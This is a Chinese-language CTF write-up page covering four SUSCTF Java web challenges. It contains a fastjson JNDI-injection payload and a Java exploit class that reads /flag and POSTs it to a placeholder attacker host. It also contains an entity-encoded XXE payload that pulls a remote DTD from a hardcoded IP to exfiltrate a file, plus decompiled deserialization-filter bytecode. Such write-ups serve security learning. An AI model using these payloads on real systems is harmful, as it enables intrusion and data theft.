@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> susctf四道Java题解 | Hello World</title>
+  <link rel = 'canonical' href = 'https://bikeknight.top/posts/susctf-java-solution/'>
+  <meta name="description" content="Do not go gentle into that good night.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="susctf四道Java题解" />
+<meta property="og:description" content="baby gadget v1.0 登录框没有什么用，扫目录可以得到路由 /admin ，方法会跳转到 index.jsp，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 /admin ，然后可以下载得到依赖 lib：
+ commons-lang.jar fastjson-1.2.48.jar flex-messaging-core.jar quartz.jar  在 /admin/maibox.jsp 下有一个输入框，猜测是用来解析json数据的，但是怎么打DNSLOG都没有反应，接着陷入了一天在给的lib里找gadget的过程，毫无收获。
+第二天经过队友@Siebene的提醒，发现下面这条payload，服务器监听的nc可以收到请求数据：
+{&#34;@type&#34;:&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;,&#34;AsText&#34;:&#34;ldap://IP:PORT/Exploit&#34;} JNDI注入，远程可以收到ldap和http请求，但是恶意字节码中的命令无法被执行，这时候转变了一下思路，尝试向远程发起HTTP请求，把要读取的文件带到body中，恶意字节码如下：
+import java.io.FileInputStream; import java.io.OutputStream; import java.net.HttpURLConnection; import java.net.URL; import java.io.OutputStreamWriter;   public class Exploit {  public Exploit() {  }   static {  try {  byte[] bytes = new byte[2048];  FileInputStream fis = new FileInputStream(&#34;/flag&#34;);  fis.read(bytes);   URL url = new URL(&#34;http://IP:6666/Foo&#34;);  HttpURLConnection connection = (HttpURLConnection) url." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bikeknight.top/posts/susctf-java-solution/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-27T21:02:11+08:00" />
+<meta property="article:modified_time" content="2022-02-27T21:02:11+08:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="susctf四道Java题解"/>
+<meta name="twitter:description" content="baby gadget v1.0 登录框没有什么用，扫目录可以得到路由 /admin ，方法会跳转到 index.jsp，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 /admin ，然后可以下载得到依赖 lib：
+ commons-lang.jar fastjson-1.2.48.jar flex-messaging-core.jar quartz.jar  在 /admin/maibox.jsp 下有一个输入框，猜测是用来解析json数据的，但是怎么打DNSLOG都没有反应，接着陷入了一天在给的lib里找gadget的过程，毫无收获。
+第二天经过队友@Siebene的提醒，发现下面这条payload，服务器监听的nc可以收到请求数据：
+{&#34;@type&#34;:&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;,&#34;AsText&#34;:&#34;ldap://IP:PORT/Exploit&#34;} JNDI注入，远程可以收到ldap和http请求，但是恶意字节码中的命令无法被执行，这时候转变了一下思路，尝试向远程发起HTTP请求，把要读取的文件带到body中，恶意字节码如下：
+import java.io.FileInputStream; import java.io.OutputStream; import java.net.HttpURLConnection; import java.net.URL; import java.io.OutputStreamWriter;   public class Exploit {  public Exploit() {  }   static {  try {  byte[] bytes = new byte[2048];  FileInputStream fis = new FileInputStream(&#34;/flag&#34;);  fis.read(bytes);   URL url = new URL(&#34;http://IP:6666/Foo&#34;);  HttpURLConnection connection = (HttpURLConnection) url."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://bikeknight.top/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://bikeknight.top/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://bikeknight.top/about/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://bikeknight.top/posts/cs143-compiler/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&text=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&title=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&is_video=false&description=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&title=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&title=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&name=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3&description=baby%20gadget%20v1.0%20%e7%99%bb%e5%bd%95%e6%a1%86%e6%b2%a1%e6%9c%89%e4%bb%80%e4%b9%88%e7%94%a8%ef%bc%8c%e6%89%ab%e7%9b%ae%e5%bd%95%e5%8f%af%e4%bb%a5%e5%be%97%e5%88%b0%e8%b7%af%e7%94%b1%20%2fadmin%20%ef%bc%8c%e6%96%b9%e6%b3%95%e4%bc%9a%e8%b7%b3%e8%bd%ac%e5%88%b0%20index.jsp%ef%bc%8c%e8%bf%99%e4%b8%aa%e8%b7%b3%e8%bd%ac%e6%98%af%e7%94%b1js%e6%8e%a7%e5%88%b6%e7%9a%84%ef%bc%8c%e5%8f%af%e4%bb%a5%e6%8a%8a%e6%b5%8f%e8%a7%88%e5%99%a8js%e7%a6%81%e7%94%a8%e6%8e%89%ef%bc%8c%e7%9b%b4%e6%8e%a5%e8%ae%bf%e9%97%ae%20%2fadmin%20%ef%bc%8c%e7%84%b6%e5%90%8e%e5%8f%af%e4%bb%a5%e4%b8%8b%e8%bd%bd%e5%be%97%e5%88%b0%e4%be%9d%e8%b5%96%20lib%ef%bc%9a%0a%20commons-lang.jar%20fastjson-1.2.48.jar%20flex-messaging-core.jar%20quartz.jar%20%20%e5%9c%a8%20%2fadmin%2fmaibox.jsp%20%e4%b8%8b%e6%9c%89%e4%b8%80%e4%b8%aa%e8%be%93%e5%85%a5%e6%a1%86%ef%bc%8c%e7%8c%9c%e6%b5%8b%e6%98%af%e7%94%a8%e6%9d%a5%e8%a7%a3%e6%9e%90json%e6%95%b0%e6%8d%ae%e7%9a%84%ef%bc%8c%e4%bd%86%e6%98%af%e6%80%8e%e4%b9%88%e6%89%93DNSLOG%e9%83%bd%e6%b2%a1%e6%9c%89%e5%8f%8d%e5%ba%94%ef%bc%8c%e6%8e%a5%e7%9d%80%e9%99%b7%e5%85%a5%e4%ba%86%e4%b8%80%e5%a4%a9%e5%9c%a8%e7%bb%99%e7%9a%84lib%e9%87%8c%e6%89%begadget%e7%9a%84%e8%bf%87%e7%a8%8b%ef%bc%8c%e6%af%ab%e6%97%a0%e6%94%b6%e8%8e%b7%e3%80%82%0a%e7%ac%ac%e4%ba%8c%e5%a4%a9%e7%bb%8f%e8%bf%87%e9%98%9f%e5%8f%8b%40Siebene%e7%9a%84%e6%8f%90%e9%86%92%ef%bc%8c%e5%8f%91%e7%8e%b0%e4%b8%8b%e9%9d%a2%e8%bf%99%e6%9d%a1payload%ef%bc%8c%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9b%91%e5%90%ac%e7%9a%84nc%e5%8f%af%e4%bb%a5%e6%94%b6%e5%88%b0%e8%af%b7%e6%b1%82%e6%95%b0%e6%8d%ae%ef%bc%9a%0a%7b%26%2334%3b%40type%26%2334%3b%3a%26%2334%3borg.apache.xbean.propertyeditor.JndiConverter%26%2334%3b%2c%26%2334%3bAsText%26%2334%3b%3a%26%2334%3bldap%3a%2f%2fIP%3aPORT%2fExploit%26%2334%3b%7d%20JNDI%e6%b3%a8%e5%85%a5%ef%bc%8c%e8%bf%9c%e7%a8%8b%e5%8f%af%e4%bb%a5%e6%94%b6%e5%88%b0ldap%e5%92%8chttp%e8%af%b7%e6%b1%82%ef%bc%8c%e4%bd%86%e6%98%af%e6%81%b6%e6%84%8f%e5%ad%97%e8%8a%82%e7%a0%81%e4%b8%ad%e7%9a%84%e5%91%bd%e4%bb%a4%e6%97%a0%e6%b3%95%e8%a2%ab%e6%89%a7%e8%a1%8c%ef%bc%8c%e8%bf%99%e6%97%b6%e5%80%99%e8%bd%ac%e5%8f%98%e4%ba%86%e4%b8%80%e4%b8%8b%e6%80%9d%e8%b7%af%ef%bc%8c%e5%b0%9d%e8%af%95%e5%90%91%e8%bf%9c%e7%a8%8b%e5%8f%91%e8%b5%b7HTTP%e8%af%b7%e6%b1%82%ef%bc%8c%e6%8a%8a%e8%a6%81%e8%af%bb%e5%8f%96%e7%9a%84%e6%96%87%e4%bb%b6%e5%b8%a6%e5%88%b0body%e4%b8%ad%ef%bc%8c%e6%81%b6%e6%84%8f%e5%ad%97%e8%8a%82%e7%a0%81%e5%a6%82%e4%b8%8b%ef%bc%9a%0aimport%20java.io.FileInputStream%3b%20import%20java.io.OutputStream%3b%20import%20java.net.HttpURLConnection%3b%20import%20java.net.URL%3b%20import%20java.io.OutputStreamWriter%3b%20%20%20public%20class%20Exploit%20%7b%20%20public%20Exploit%28%29%20%7b%20%20%7d%20%20%20static%20%7b%20%20try%20%7b%20%20byte%5b%5d%20bytes%20%3d%20new%20byte%5b2048%5d%3b%20%20FileInputStream%20fis%20%3d%20new%20FileInputStream%28%26%2334%3b%2fflag%26%2334%3b%29%3b%20%20fis.read%28bytes%29%3b%20%20%20URL%20url%20%3d%20new%20URL%28%26%2334%3bhttp%3a%2f%2fIP%3a6666%2fFoo%26%2334%3b%29%3b%20%20HttpURLConnection%20connection%20%3d%20%28HttpURLConnection%29%20url." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&t=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#baby-gadget-v10">baby gadget v1.0</a></li>
+    <li><a href="#baby-gadget-v10s-rrrevenge">baby gadget v1.0&rsquo;s rrrevenge</a></li>
+    <li><a href="#baby-gadget-v20">baby gadget v2.0</a></li>
+    <li><a href="#baby-gadget-v20-revenge">baby gadget v2.0 revenge</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        susctf四道Java题解
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2022-02-27 21:02:11 &#43;0800 CST" itemprop="datePublished">2022-02-27</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ctf" rel="tag">CTF</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h2 id="baby-gadget-v10">baby gadget v1.0</h2>
+<p>登录框没有什么用，扫目录可以得到路由 <code>/admin</code> ，方法会跳转到 <code>index.jsp</code>，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 <code>/admin</code> ，然后可以下载得到依赖 <code>lib</code>：</p>
+<ul>
+<li>commons-lang.jar</li>
+<li><strong>fastjson-1.2.48.jar</strong></li>
+<li>flex-messaging-core.jar</li>
+<li>quartz.jar</li>
+</ul>
+<p>在 <code>/admin/maibox.jsp</code> 下有一个输入框，猜测是用来解析json数据的，但是怎么打DNSLOG都没有反应，接着陷入了一天在给的lib里找gadget的过程，毫无收获。</p>
+<p>第二天经过队友@Siebene的提醒，发现下面这条payload，服务器监听的nc可以收到请求数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#6ab825;font-weight:bold">&#34;@type&#34;</span>:<span style="color:#ed9d13">&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;AsText&#34;</span>:<span style="color:#ed9d13">&#34;ldap://IP:PORT/Exploit&#34;</span>}
+</span></span></code></pre></div><p>JNDI注入，远程可以收到ldap和http请求，但是恶意字节码中的命令无法被执行，这时候转变了一下思路，尝试向远程发起HTTP请求，把要读取的文件带到body中，恶意字节码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">java.io.FileInputStream</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">java.io.OutputStream</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">java.net.HttpURLConnection</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">java.net.URL</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">java.io.OutputStreamWriter</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">Exploit</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#447fcf">Exploit</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">static</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">byte</span>[] bytes = <span style="color:#6ab825;font-weight:bold">new</span> <span style="color:#6ab825;font-weight:bold">byte</span>[2048];
+</span></span><span style="display:flex;"><span>            FileInputStream fis = <span style="color:#6ab825;font-weight:bold">new</span> FileInputStream(<span style="color:#ed9d13">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>            fis.<span style="color:#bbb">read</span>(bytes);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            URL url = <span style="color:#6ab825;font-weight:bold">new</span> URL(<span style="color:#ed9d13">&#34;http://IP:6666/Foo&#34;</span>);
+</span></span><span style="display:flex;"><span>            HttpURLConnection connection = (HttpURLConnection) url.<span style="color:#bbb">openConnection</span>();
+</span></span><span style="display:flex;"><span>            connection.<span style="color:#bbb">setRequestMethod</span>(<span style="color:#ed9d13">&#34;POST&#34;</span>);
+</span></span><span style="display:flex;"><span>            connection.<span style="color:#bbb">setDoOutput</span>(<span style="color:#6ab825;font-weight:bold">true</span>);
+</span></span><span style="display:flex;"><span>            connection.<span style="color:#bbb">connect</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            OutputStreamWriter writer = <span style="color:#6ab825;font-weight:bold">new</span> OutputStreamWriter(connection.<span style="color:#bbb">getOutputStream</span>());
+</span></span><span style="display:flex;"><span>            writer.<span style="color:#bbb">write</span>(<span style="color:#6ab825;font-weight:bold">new</span> String(bytes));
+</span></span><span style="display:flex;"><span>            writer.<span style="color:#bbb">flush</span>();
+</span></span><span style="display:flex;"><span>            writer.<span style="color:#bbb">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(connection.<span style="color:#bbb">getResponseCode</span>());
+</span></span><span style="display:flex;"><span>        } <span style="color:#6ab825;font-weight:bold">catch</span> (Exception var1) {
+</span></span><span style="display:flex;"><span>            var1.<span style="color:#bbb">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>服务器nc监听，拿到了flag。</p>
+<h2 id="baby-gadget-v10s-rrrevenge">baby gadget v1.0&rsquo;s rrrevenge</h2>
+<p>exp同上，修改端口直接得到flag，估计是非预期，通解了两个题。</p>
+<h2 id="baby-gadget-v20">baby gadget v2.0</h2>
+<p>开局的登陆框数据是以xml形式传输的，猜测这里有XXE，经过常规的payload测试发现之后 <code>SYSTEM</code> 被ban了，同时响应包里给了<code>hint.txt</code> ，可能要用XXE来读取根目录下的这个文件。</p>
+<p><code>SYSTEM</code> 可以用HTML实体编码绕过：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227212051124.png" alt="image-20220227212051124"></p>
+<p>payload为：</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a &#34;&amp;#x3C;&amp;#x21;&amp;#x45;&amp;#x4E;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4D;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x38;&amp;#x32;&amp;#x2E;&amp;#x31;&amp;#x35;&amp;#x36;&amp;#x2E;&amp;#x35;&amp;#x37;&amp;#x2E;&amp;#x31;&amp;#x38;&amp;#x37;&amp;#x3A;&amp;#x38;&amp;#x30;&amp;#x30;&amp;#x30;&amp;#x2F;&amp;#x62;&amp;#x79;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3E;&#34; &gt;%a;%dtd;]&gt;&lt;data&gt;&lt;env&gt;&amp;exfil;&lt;/env&gt;&lt;/data&gt;
+</code></pre><p>去请求远程服务器的<code>.dtd</code> 文件：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227212151826.png" alt="image-20220227212151826"></p>
+<p>nc收到请求，下载 <code>58f9f32d633491243ee01cbe86f69be9.zip</code>（这里只能读取hint.txt，读取其他文件收不到请求），里面是源码的ASM「汇编」形式：</p>
+<pre tabindex="0"><code>JRE: 
+8u191
+Dependency:
+commons-collections3.1
+Source Code:
+public submitUrl(Ljava/lang/String;)V throws java/io/IOException java/lang/ClassNotFoundException 
+    // parameter  request
+  @Lorg/springframework/web/bind/annotation/ResponseBody;()
+  @Lorg/springframework/web/bind/annotation/PostMapping;(value={&#34;/bf2dcf6664b16e0efe471b2eac2b54b2&#34;})
+    // annotable parameter count: 1 (visible)
+    @Lorg/springframework/web/bind/annotation/RequestBody;() // parameter 0
+   L0
+    LINENUMBER 66 L0
+    NEW sun/misc/BASE64Decoder
+    DUP
+    INVOKESPECIAL sun/misc/BASE64Decoder.&lt;init&gt; ()V
+    ASTORE 2
+   L1
+    LINENUMBER 67 L1
+    ALOAD 2
+    ALOAD 1
+    INVOKESTATIC java/net/URLDecoder.decode (Ljava/lang/String;)Ljava/lang/String;
+    INVOKEVIRTUAL sun/misc/BASE64Decoder.decodeBuffer (Ljava/lang/String;)[B
+    ASTORE 3
+   L2
+    LINENUMBER 68 L2
+    NEW java/io/ByteArrayInputStream
+    DUP
+    ALOAD 3
+    INVOKESPECIAL java/io/ByteArrayInputStream.&lt;init&gt; ([B)V
+    ASTORE 4
+   L3
+    LINENUMBER 69 L3
+    NEW com/tr1ple/sus/controller/SafeInputStream
+    DUP
+    ALOAD 4
+    INVOKESPECIAL com/tr1ple/sus/controller/SafeInputStream.&lt;init&gt; (Ljava/io/InputStream;)V
+    ASTORE 5
+   L4
+    LINENUMBER 70 L4
+    ALOAD 5
+    INVOKEVIRTUAL com/tr1ple/sus/controller/SafeInputStream.readObject ()Ljava/lang/Object;
+    POP
+   L5
+    LINENUMBER 71 L5
+    ALOAD 5
+    INVOKEVIRTUAL com/tr1ple/sus/controller/SafeInputStream.close ()V
+   L6
+    LINENUMBER 72 L6
+    RETURN
+   L7
+    LOCALVARIABLE this Lcom/tr1ple/sus/controller/ServerController; L0 L7 0
+    LOCALVARIABLE request Ljava/lang/String; L0 L7 1
+    LOCALVARIABLE b64 Lsun/misc/BASE64Decoder; L1 L7 2
+    LOCALVARIABLE requestDe [B L2 L7 3
+    LOCALVARIABLE inputStream Ljava/io/InputStream; L3 L7 4
+    LOCALVARIABLE ois Lcom/tr1ple/sus/controller/SafeInputStream; L4 L7 5
+    MAXSTACK = 3
+    MAXLOCALS = 6
+
+
+public class com/tr1ple/sus/controller/SafeInputStream extends java/io/ObjectInputStream {
+
+  // compiled from: SafeInputStream.java
+
+  // access flags 0x1
+  public Z entry
+
+  // access flags 0x1A
+  private final static [Ljava/lang/String; blacklist
+
+  // access flags 0x1
+  public &lt;init&gt;(Ljava/io/InputStream;)V throws java/io/IOException 
+    // parameter  is
+   L0
+    LINENUMBER 21 L0
+    ALOAD 0
+    ALOAD 1
+    INVOKESPECIAL java/io/ObjectInputStream.&lt;init&gt; (Ljava/io/InputStream;)V
+   L1
+    LINENUMBER 11 L1
+    ALOAD 0
+    ICONST_1
+    PUTFIELD com/tr1ple/sus/controller/SafeInputStream.entry : Z
+   L2
+    LINENUMBER 22 L2
+    RETURN
+   L3
+    LOCALVARIABLE this Lcom/tr1ple/sus/controller/SafeInputStream; L0 L3 0
+    LOCALVARIABLE is Ljava/io/InputStream; L0 L3 1
+    MAXSTACK = 2
+    MAXLOCALS = 2
+
+  // access flags 0x1
+  // signature (Ljava/io/ObjectStreamClass;)Ljava/lang/Class&lt;*&gt;;
+  // declaration: java.lang.Class&lt;?&gt; resolveClass(java.io.ObjectStreamClass)
+  public resolveClass(Ljava/io/ObjectStreamClass;)Ljava/lang/Class; throws java/io/IOException java/lang/ClassNotFoundException 
+    // parameter  des
+   L0
+    LINENUMBER 26 L0
+    ALOAD 0
+    GETFIELD com/tr1ple/sus/controller/SafeInputStream.entry : Z
+    IFEQ L1
+   L2
+    LINENUMBER 27 L2
+    ALOAD 0
+    ICONST_0
+    PUTFIELD com/tr1ple/sus/controller/SafeInputStream.entry : Z
+   L3
+    LINENUMBER 28 L3
+    GETSTATIC com/tr1ple/sus/controller/SafeInputStream.blacklist : [Ljava/lang/String;
+    INVOKESTATIC java/util/Arrays.asList ([Ljava/lang/Object;)Ljava/util/List;
+    ALOAD 1
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    INVOKEINTERFACE java/util/List.contains (Ljava/lang/Object;)Z (itf)
+    IFNE L4
+    ALOAD 1
+   L5
+    LINENUMBER 29 L5
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Set&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFNE L4
+    ALOAD 1
+   L6
+    LINENUMBER 30 L6
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;List&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFNE L4
+    ALOAD 1
+   L7
+    LINENUMBER 31 L7
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Map&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFNE L4
+    ALOAD 1
+   L8
+    LINENUMBER 32 L8
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Tree&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFNE L4
+    ALOAD 1
+   L9
+    LINENUMBER 33 L9
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Font&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFNE L4
+    ALOAD 1
+   L10
+    LINENUMBER 34 L10
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Support&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
